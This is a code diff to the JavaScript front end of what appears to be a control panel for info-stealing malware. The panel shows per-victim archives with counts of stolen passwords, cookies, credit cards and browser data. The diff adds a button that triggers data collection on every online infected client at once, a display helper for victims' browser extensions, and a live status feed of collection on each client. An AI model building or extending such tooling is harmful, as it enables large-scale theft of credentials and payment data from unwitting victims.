@@ -8,6 +8,7 @@
   const statusEl = document.getElementById("xf-status");
   const clientSelect = document.getElementById("xf-client-select");
   const collectBtn = document.getElementById("xf-collect-btn");
+  const collectAllBtn = document.getElementById("xf-collect-all-btn");
 
   const viewer = document.getElementById("xf-viewer");
   const viewerTitle = document.getElementById("xf-viewer-title");
@@ -93,6 +94,20 @@
     return archives.filter((row) => searchableText(row).includes(filter));
   }
 
+  // Raw 32-char extension IDs (unmapped extensions) are grouped for display;
+  // the full list stays in the tooltip.
+  function displayExtensions(value) {
+    if (!Array.isArray(value)) return "";
+    const known = [];
+    let unknown = 0;
+    for (const e of value.filter(Boolean)) {
+      if (/^[a-z]{32}$/.test(e)) unknown++;
+      else known.push(e);
+    }
+    if (unknown > 0) known.push(`${unknown} unknown`);
+    return known.join(", ");
+  }
+
   function renderTable() {
     const rows = filteredArchives();
     checkAll.checked = rows.length > 0 && rows.every((r) => selected.has(r.id));
@@ -124,7 +139,7 @@
         <td class="xf-col-center"><input type="checkbox" class="xf-seen-check" data-id="${row.id}" ${seenChecked} title="Mark reviewed" /></td>
         <td class="xf-col-num">${fmtNum(info.HistoryCount)}</td>
         <td class="xf-col-list" title="${escapeHtml(joinList(info.Browsers))}">${escapeHtml(joinList(info.Browsers))}</td>
-        <td class="xf-col-list" title="${escapeHtml(joinList(info.BrowserExtensions))}">${escapeHtml(joinList(info.BrowserExtensions))}</td>
+        <td class="xf-col-list" title="${escapeHtml(joinList(info.BrowserExtensions))}">${escapeHtml(displayExtensions(info.BrowserExtensions))}</td>
         <td class="xf-col-num">${fmtNum(info.PasswordsCount)}</td>
         <td class="xf-col-num">${fmtNum(info.CookiesCount)}</td>
         <td class="xf-col-num">${fmtNum(info.CreditCardsCount)}</td>
@@ -340,6 +355,36 @@
     }
   });
 
+  if (collectAllBtn) {
+    collectAllBtn.addEventListener("click", async () => {
+      collectAllBtn.disabled = true;
+      try {
+        const res = await fetch("/api/clients?pageSize=500&status=online");
+        if (!res.ok) throw new Error(res.statusText);
+        const data = await res.json();
+        const online = (data.items || []).filter((c) => c.online);
+        if (online.length === 0) {
+          showStatus("no clients online", true);
+          return;
+        }
+        let ok = 0;
+        for (const c of online) {
+          const r = await fetch(`/api/clients/${encodeURIComponent(c.id)}/plugins/${PLUGIN_ID}/event`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ event: "collect", payload: {} }),
+          });
+          if (r.ok) ok++;
+        }
+        showStatus(`collect triggered on ${ok}/${online.length} clients`, false, true);
+      } catch (err) {
+        showStatus(`collect all failed: ${err.message}`, true);
+      } finally {
+        collectAllBtn.disabled = false;
+      }
+    });
+  }
+
   /* ── archive viewer ── */
 
   function buildTree(entries) {
@@ -541,6 +586,31 @@
 
   loadTgSettings();
   }
+
+  /* ── per-client collect status ── */
+
+  const clientStatusEl = document.getElementById("xf-client-status");
+
+  async function refreshClientStatus() {
+    if (!clientStatusEl) return;
+    try {
+      const rows = await rpc("clientStatus");
+      if (!Array.isArray(rows) || rows.length === 0) {
+        clientStatusEl.classList.add("hidden");
+        return;
+      }
+      const lines = rows.map((s) => {
+        const ago = Math.max(0, Math.round((Date.now() - s.at) / 1000));
+        const msg = s.message ? ` — ${s.message}` : "";
+        return `${s.clientId.slice(0, 12)}…  ${s.stage}${msg}  (${ago}s ago)`;
+      });
+      clientStatusEl.textContent = lines.join("\n");
+      clientStatusEl.classList.remove("hidden");
+    } catch {}
+  }
+
+  refreshClientStatus();
+  setInterval(refreshClientStatus, 15000);
 
   /* ── live updates ── */
 
